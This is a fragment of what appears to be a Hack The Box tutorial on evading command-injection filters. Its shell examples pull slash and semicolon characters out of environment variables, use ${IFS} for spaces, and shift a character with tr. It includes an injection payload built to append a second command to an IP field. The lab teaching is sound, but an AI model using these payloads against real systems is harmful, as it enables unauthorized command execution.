...
```shell-session
swmpdnky@htb[/htb]$ echo ${PATH:0:1}
...
```shell-session
swmpdnky@htb[/htb]$ echo ${LS_COLORS:10:1}
...
So, let's try to use environment variables to add a semi-colon and a space to our payload (`127.0.0.1${LS_COLORS:10:1}${IFS}`) as our payload, and see if we can bypass the filter: ![Filter Operator](imgs/cmdinj_filters_spaces_5.jpg)
...
```shell-session
swmpdnky@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
swmpdnky@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)
